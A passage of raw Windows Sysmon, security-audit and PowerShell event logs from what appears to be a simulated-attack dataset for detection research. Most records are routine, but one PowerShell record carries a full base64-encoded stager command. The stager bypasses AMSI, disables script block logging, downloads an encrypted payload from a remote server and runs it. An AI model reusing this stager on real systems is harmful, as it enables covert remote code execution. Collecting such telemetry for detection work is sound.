ID = 1\r\n        Command Name = ForEach-Object\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 28432\r\n        User = THESHIRE\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","SourceName":"Microsoft-Windows-PowerShell","Version":1,"Category":"Executing Pipeline","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":-9214364837600034816,"SeverityValue":2,"SubjectDomainName":"THESHIRE","EventID":4658,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","SubjectUserSid":"S-1-5-21-4228717743-1032521047-1810997296-1104","EventReceivedTime":"2020-09-22 04:22:44","ProcessId":"0x1f00","ThreadID":6776,"EventType":"AUDIT_SUCCESS","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Message":"The handle to an object was closed.\r\n\r\nSubject :\r\n\tSecurity ID:\t\tS-1-5-21-4228717743-1032521047-1810997296-1104\r\n\tAccount Name:\t\tpgustavo\r\n\tAccount Domain:\t\tTHESHIRE\r\n\tLogon ID:\t\t0x10A7DF\r\n\r\nObject:\r\n\tObject Server:\t\tSecurity\r\n\tHandle ID:\t\t0xb0c\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x1f00\r\n\tProcess Name:\t\tC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","@timestamp":"2020-09-22T08:22:44.450Z","ObjectServer":"Security","SubjectLogonId":"0x10a7df","SourceModuleType":"im_msvistalog","port":64545,"ProcessName":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","RecordNumber":820551,"SubjectUserName":"pgustavo","Task":12801,"@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","Severity":"INFO","HandleId":"0xb0c","SourceName":"Microsoft-Windows-Security-Auditing","Version":0,"Category":"Registry","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"SeverityValue":2,"SubjectDomainName":"THESHIRE","EventReceivedTime":"2020-09-22 04:22:44","EventID":4656,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","ProcessId":"0x1f00","Opcode":"Info","EventTime":"2020-09-22 04:22:43","TransactionId":"{00000000-0000-0000-0000-000000000000}","ObjectServer":"Security","AccessMask":"0x20019","SourceModuleType":"im_msvistalog","ProcessName":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","@version":"1","OpcodeValue":0,"Severity":"INFO","HandleId":"0x168","ObjectName":"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\.NETFramework","SourceName":"Microsoft-Windows-Security-Auditing","Category":"Registry","Keywords":-9214364837600034816,"ObjectType":"Key","SubjectUserSid":"S-1-5-21-4228717743-1032521047-1810997296-1104","ThreadID":6776,"EventType":"AUDIT_SUCCESS","Message":"A handle to an object was requested.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-21-4228717743-1032521047-1810997296-1104\r\n\tAccount Name:\t\tpgustavo\r\n\tAccount Domain:\t\tTHESHIRE\r\n\tLogon ID:\t\t0x10A7DF\r\n\r\nObject:\r\n\tObject Server:\t\tSecurity\r\n\tObject Type:\t\tKey\r\n\tObject Name:\t\t\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\.NETFramework\r\n\tHandle ID:\t\t0x168\r\n\tResource Attributes:\t-\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x1f00\r\n\tProcess Name:\t\tC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\r\n\r\nAccess Request Information:\r\n\tTransaction ID:\t\t{00000000-0000-0000-0000-000000000000}\r\n\tAccesses:\t\tREAD_CONTROL\r\n\t\t\t\tQuery key value\r\n\t\t\t\tEnumerate sub-keys\r\n\t\t\t\tNotify about changes to keys\r\n\t\t\t\t\r\n\tAccess Reasons:\t\t-\r\n\tAccess Mask:\t\t0x20019\r\n\tPrivileges Used for Access Check:\t-\r\n\tRestricted SID Count:\t0","AccessReason":"-","PrivilegeList":"-","@timestamp":"2020-09-22T08:22:44.450Z","SubjectLogonId":"0x10a7df","port":64545,"RecordNumber":820552,"SubjectUserName":"pgustavo","Task":12801,"SourceModuleName":"eventlog","Version":1,"AccessList":"%%1538\r\n\t\t\t\t%%4432\r\n\t\t\t\t%%4435\r\n\t\t\t\t%%4436\r\n\t\t\t\t","RestrictedSidCount":"0","ResourceAttributes":"-","Hostname":"WORKSTATION5.theshire.local","tags":["mordorDataset"]}
{"ImageLoaded":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b453-5f69-c902-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=22A72E39D307BC628093B043EF058DB1310BBF4B,MD5=28D96A80131C05E552066C798C0D8ACB,SHA256=C5270C0D8718C66382240DB538F9BACDED8DB55424768C2D942A6210B96B2720,IMPHASH=EE1E569AD02AA1F7AECA80AC0601D80D","SourceName":"Microsoft-Windows-Sysmon","Description":"Visual C# Command Line Compiler","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"4.8.3752.0 built by: NET48REL1","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.451Z","port":64545,"RecordNumber":3399410,"Task":7,"Signature":"Microsoft Corporation","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft .NET Framework","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"csc.exe","UtcTime":"2020-09-22 08:22:43.553","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":0,"SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":4103,"ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","ExecutionProcessID":5972,"Channel":"Microsoft-Windows-PowerShell/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ActivityID":"{3AF69DEC-79B4-0000-9F2D-2D856290D601}","UserID":"S-1-5-18","ThreadID":8112,"EventType":"INFO","Opcode":"To be used when operation is just executing a method","EventTime":"2020-09-22 04:22:43","@timestamp":"2020-09-22T08:22:44.452Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":213906,"Payload":"CommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"byte[]\"\r\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"32\"\r\n","Task":106,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":20,"SourceModuleName":"eventlog","ERROR_EVT_UNRESOLVED":true,"Severity":"INFO","ContextInfo":"        Severity = Informational\r\n        Host Name = Default Host\r\n        Host Version = 5.1.18362.752\r\n        Host ID = da6e33cf-5ea5-45e8-b75b-b0fc1487af33\r\n        Host Application = C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAcwBJAE8AbgBUAEEAYgBsAGUALgBQAFMAVgBlAFIAcwBpAG8AbgAuAE0AQQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABBAEMARQA2AD0AWwByAEUAZgBdAC4AQQBzAHMARQBNAGIATABZAC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAAbABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAGYAKAAkAEEAYwBlADYAKQB7ACQANABjADAARAA9ACQAQQBjAGUANgAuAEcARQB0AFYAYQBMAFUAZQAoACQATgBVAEwAbAApADsASQBmACgAJAA0AGMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQANABjADAAZABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0AEMAMABEAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAGwAPQBbAEMAbwBMAEwAZQBDAHQAaQBPAE4AcwAuAEcAZQBuAEUAUgBpAEMALgBEAEkAQwB0AEkAbwBOAEEAUgB5AFsAUwB0AFIAaQBOAGcALABTAFkAUwBUAEUAbQAuAE8AYgBqAGUAQwBUAF0AXQA6ADoATgBlAHcAKAApADsAJABWAEEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABWAGEATAAuAEEARABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkADQAQwAwAGQAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBhAEwAfQBFAGwAUwBFAHsAWwBTAGMAcgBJAFAAVABCAEwAbwBDAEsAXQAuACIARwBFAFQARgBpAEUAYABMAEQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAYQBsAFUAZQAoACQAbgBVAGwATAAsACgATgBlAFcALQBPAGIAagBFAEMAVAAgAEMATwBsAEwAZQBDAHQASQBPAG4AUwAuAEcARQBOAEUAcgBpAGMALgBIAGEAUwBoAFMAZQBUAFsAcwBUAFIASQBOAGcAXQApACkAfQAkAFIAZQBmAD0AWwBSAEUARgBdAC4AQQBzAHMARQBNAGIATAB5AC4ARwBlAFQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwArACcAVQB0AGkAbABzACcAKQA7ACQAUgBFAGYALgBHAEUAVABGAGkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGACcAKwAnAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAQQBMAHUAZQAoACQAbgBVAEwATAAsACQAdABSAFUARQApADsAfQA7AFsAUwBZAFMAVABFAE0ALgBOAEUAVAAuAFMARQBSAFYASQBDAEUAUABvAEkAbgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQB4AHAAZQBjAFQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAMAA5ADcAQwA9AE4AZQBXAC0ATwBiAGoAZQBDAFQAIABTAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQB4AHQALgBFAE4AQwBvAEQASQBOAEcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVAByAGkAbgBHACgAWwBDAG8ATgBWAEUAUgBUAF0AOgA6AEYAUgBPAG0AQgBhAHMAZQA2ADQAUwBUAFIAaQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADAAOQA3AEMALgBIAGUAQQBEAGUAUgBzAC4AQQBEAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAAwADkANwBjAC4AUABSAG8AeABZAD0AWwBTAHkAUwB0AGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBFAHEAdQBFAHMAdABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBvAFgAeQA7ACQAMAA5ADcAYwAuAFAAcgBvAFgAWQAuAEMAUgBFAGQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQARQBtAC4ATgBFAFQALgBDAHIAZQBEAEUAbgB0AEkAQQBsAEMAQQBDAGgARQBdADoAOgBEAEUARgBhAFUATAB0AE4ARQB0AHcAbwByAGsAQwByAGUAZABlAE4AVABpAGEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADAAOQA3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABFAFgAVAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAVABFAFMAKAAnADQARwBMAHkAXwA2ADwAKgBpAGYAcgA+AE0AVwB9AEkAKQBVAHAAdgB4AEAASwB1AFMAfgAzAGwAZABZADgAawAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkADAAOQA3AEMALgBIAEUAQQBkAGUAUgBzAC4AQQBEAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAG0AZABKAGYASAByAFUAPQBHAGgAagBOAGQAUABCADIATABEAE0ALwBpAG8ATgBXAFQAOABWAEkAVwBXAFcAaABOAGwAQQA9ACIAKQA7ACQARABBAHQAYQA9ACQAMAA5ADcAQwAuAEQATwBXAG4ATABPAEEARABEAGEAVABBACgAJABzAEUAUgArACQAdAApADsAJABpAHYAPQAkAGQAQQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAQQBUAEEAPQAkAGQAQQBUAGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBHAHQASABdADsALQBKAG8AaQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==\r\n        Engine Version = 5.1.18362.752\r\n        Runspace ID = 50f3d352-332d-4cc2-9811-b903295a8adb\r\n        Pipeline ID = 1\r\n        Command Name = New-Object\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 28434\r\n        User = THESHIRE\\pgustavo\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","SourceName":"Microsoft-Windows-PowerShell","Version":1,"Category":"Executing Pipeline","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":-9214364837600034816,"SeverityValue":2,"SubjectDomainName":"THESHIRE","EventID":4658,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","SubjectUserSid":"S-1-5-21-4228717743-1032521047-1810997296-1104","EventReceivedTime":"2020-09-22 04:22:44","ProcessId":"0x1f00","ThreadID":6776,"EventType":"AUDIT_SUCCESS","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Message":"The handle to an object was closed.\r\n\r\nSubject :\r\n\tSecurity ID:\t\tS-1-5-21-4228717743-1032521047-1810997296-1104\r\n\tAccount Name:\t\tpgustavo\r\n\tAccount Domain:\t\tTHESHIRE\r\n\tLogon ID:\t\t0x10A7DF\r\n\r\nObject:\r\n\tObject Server:\t\tSecurity\r\n\tHandle ID:\t\t0x168\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x1f00\r\n\tProcess Name:\t\tC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","@timestamp":"2020-09-22T08:22:44.452Z","ObjectServer":"Security","SubjectLogonId":"0x10a7df","SourceModuleType":"im_msvistalog","port":64545,"ProcessName":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","RecordNumber":820553,"SubjectUserName":"pgustavo","Task":12801,"@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","Severity":"INFO","HandleId":"0x168","SourceName":"Microsoft-Windows-Security-Auditing","Version":0,"Category":"Registry","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"ImageLoaded":"C:\\Windows\\System32\\ntdll.dll","SeverityValue":2,"EventReceivedTime":"2020-09-22 04:22:44","EventID":7,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","ProcessGuid":"{b34bc01c-b453-5f69-c902-000000000900}","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Signed":"true","SourceModuleType":"im_msvistalog","AccountName":"SYSTEM","Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SignatureStatus":"Valid","Severity":"INFO","Hashes":"SHA1=BFD8EE26537D8C30A5FE2C9753AEED3BB6930004,MD5=BD5F9D4684E7BCB9D41D298297A73956,SHA256=FB9DA8BAF27DADDE620C2D8D3CADDD4CF7BF405A9BC8E870A73B6CF163046176,IMPHASH=00000000000000000000000000000000","SourceName":"Microsoft-Windows-Sysmon","Description":"NT Layer DLL","Category":"Image loaded (rule: ImageLoad)","Company":"Microsoft Corporation","Keywords":-9223372036854775808,"FileVersion":"10.0.18362.1049 (WinBuild.160101.0800)","UserID":"S-1-5-18","ThreadID":4048,"EventType":"INFO","@timestamp":"2020-09-22T08:22:44.453Z","port":64545,"RecordNumber":3399411,"Task":7,"Signature":"Microsoft Windows","SourceModuleName":"eventlog","Version":3,"Product":"Microsoft Windows Operating System","Image":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","OriginalFileName":"ntdll.dll","UtcTime":"2020-09-22 08:22:43.553","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\svchost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{b34bc01c-226b-5f69-1000-000000000900}","ThreadID":4048,"TargetImage":"C:\\windows\\System32\\svchost.exe","GrantedAccess":"0x1000","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:43","EventReceivedTime":"2020-09-22 04:22:44","@timestamp":"2020-09-22T08:22:44.453Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3399412,"SourceProcessId":"908","SourceThreadId":"7520","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{b34bc01c-2271-5f69-5500-000000000900}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"3308","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-22 08:22:43.553","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"Keywords":-9214364837600034816,"SeverityValue":2,"SubjectDomainName":"THESHIRE","EventID":4690,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","SubjectUserSid":"S-1-5-21-4228717743-1032521047-1810997296-1104","EventReceivedTime":"2020-09-22 04:22:44","ProcessId":"0x1f00","ThreadID":6776,"EventType":"AUDIT_SUCCESS","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Message":"An attempt was made to duplicate a handle to an object.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-21-4228717743-1032521047-1810997296-1104\r\n\tAccount Name:\t\tpgustavo\r\n\tAccount Domain:\t\tTHESHIRE\r\n\tLogon ID:\t\t0x10A7DF\r\n\r\nSource Handle Information:\r\n\tSource Handle ID:\t0x164\r\n\tSource Process ID:\t0x1f00\r\n\r\nNew Handle Information:\r\n\tTarget Handle ID:\t0xb0c\r\n\tTarget Process ID:\t0x4","SourceHandleId":"0x164","TargetHandleId":"0xb0c","@timestamp":"2020-09-22T08:22:44.454Z","SubjectLogonId":"0x10a7df","SourceModuleType":"im_msvistalog","port":64545,"RecordNumber":820554,"SubjectUserName":"pgustavo","SourceProcessId":"0x1f00","Task":12807,"@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","Severity":"INFO","SourceName":"Microsoft-Windows-Security-Auditing","Version":0,"TargetProcessId":"0x4","Category":"Handle Manipulation","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":-9214364837600034816,"SeverityValue":2,"SubjectDomainName":"THESHIRE","EventID":4658,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","SubjectUserSid":"S-1-5-21-4228717743-1032521047-1810997296-1104","EventReceivedTime":"2020-09-22 04:22:44","ProcessId":"0x1f00","ThreadID":6776,"EventType":"AUDIT_SUCCESS","Opcode":"Info","EventTime":"2020-09-22 04:22:43","Message":"The handle to an object was closed.\r\n\r\nSubject :\r\n\tSecurity ID:\t\tS-1-5-21-4228717743-1032521047-1810997296-1104\r\n\tAccount Name:\t\tpgustavo\r\n\tAccount Domain:\t\tTHESHIRE\r\n\tLogon ID:\t\t0x10A7DF\r\n\r\nObject:\r\n\tObject Server:\t\tSecurity\r\n\tHandle ID:\t\t0xb0c\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x1f00\r\n\tProcess Name:\t\tC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","@timestamp":"2020-09-22T08:22:44.454Z","ObjectServer":"Security","SubjectLogonId":"0x10a7df","SourceModuleType":"im_msvistalog","port":64545,"ProcessName":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","RecordNumber":820555,"SubjectUserName":"pgustavo","Task":12801,"@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","Severity":"INFO","HandleId":"0xb0c","SourceName":"Microsoft-Windows-Security-Auditing","Version":0,"Category":"Registry","tags":["mordorDataset"],"Hostname":"WORKSTATION5.theshire.local"}
{"Keywords":-9223372036854775808,"SeverityValue":2,"SourceImage":"C:\\windows\\system32\\svchost.exe","EventID":10,"ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","ExecutionProcessID":3172,"Channel":"Microsoft-Windows-Sysmon/Operational","host":"wec.internal.cloudapp.net","AccountType":"User","UserID":"S-1-5-18","SourceProcessGUID":"{b34bc01c-226b-5f69-1000-000000000900}","ThreadID":4048,"TargetImage":"C:\\windows\\System32\\svchost.exe","GrantedAccess":"0x1000","EventType":"INFO","Opcode":"Info","EventTime":"2020-09-22 04:22:43","EventReceivedTime":"2020-09-22 04:22:44","@timestamp":"2020-09-22T08:22:44.454Z","SourceModuleType":"im_msvistalog","port":64545,"AccountName":"SYSTEM","RecordNumber":3399413,"SourceProcessId":"908","SourceThreadId":"7520","Task":10,"Domain":"NT AUTHORITY","@version":"1","OpcodeValue":0,"SourceModuleName":"eventlog","TargetProcessGUID":"{b34bc01c-2271-5f69-5500-000000000900}","Severity":"INFO","SourceName":"Microsoft-Windows-Sysmon","Version":3,"TargetProcessId":"3308","Category":"Process accessed (rule: ProcessAccess)","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+222a3|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+1a172|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19e3b|C:\\windows\\SYSTEM32\\psmserviceexthost.dll+19318|C:\\windows\\SYSTEM32\\ntdll.dll+3081d|C:\\windows\\SYSTEM32\\ntdll.dll+345b4|C:\\windows\\System32\\KERNEL32.DLL+17bd4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce51","UtcTime":"2020-09-22 08:22:43.553","Hostname":"WORKSTATION5.theshire.local","RuleName":"-","tags":["mordorDataset"]}
{"SeverityValue":2,"SubjectDomainName":"THESHIRE","EventReceivedTime":"2020-09-22 04:22:44","EventID":4656,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","ExecutionProcessID":4,"Channel":"security","host":"wec.internal.cloudapp.net","ProcessId":"0x1f00","Opcode":"Info","EventTime":"2020-09-22 04:22:43","TransactionId":"{00000000-0000-0000-0000-000000000000}","ObjectServer":"Security","AccessMask":"0x20019","SourceModuleType":"im_msvistalog","ProcessName":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe","@version":"1","OpcodeValue":0,"Severity":"INFO","HandleId":"0x164","ObjectName":"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\.NETFramework","SourceName":"Microsoft-Windows-Security-Auditing","Category":"Registry","Keywords":-9214364837600034816,"ObjectType":"Key","SubjectUserSid":"S-1-5-21-4228717743-1032521047-1810997296-1104","ThreadID":6776,"EventType":"AUDIT_SUCCESS","Message":"A handle to an object was requested.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-5-21-4228717743-1032521047-1810997296-1104\r\n\tAccount Name:\t\tpgustavo\r\n\tAccount Domain:\t\tTHESHIRE\r\n\tLogon ID:\t\t0x10A7DF\r\n\r\nObject:\r\n\tObject Server:\t\tSecurity\r\n\tObject Type:\t\tKey\r\n\tObject Name:\t\t\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\.NETFramework\r\n\tHandle ID:\t\t0x164\r\n\tResource Attributes:\t-\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x1f00\r\n\tProcess Name:\t\tC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\r\n\r\nAccess Request Information:\r\n\tTransaction ID:\t\t{00000000-0000-0000-0000-000000000000}\r\n\tAccesses:\t\tREAD_CONTROL\r\n\t\t\t\tQuery key value\r\n\t\t\t\tEnumerate sub-keys\r\n\t\t\t\tNotify about changes to keys\r\n\t\t\t\t\r\n\tAccess Reasons:\t\t-\r\n\tAccess Mask:\t\t0x20019\r\n\tPrivileges Used for Access Check:\t-\r\n\tRestricted SID 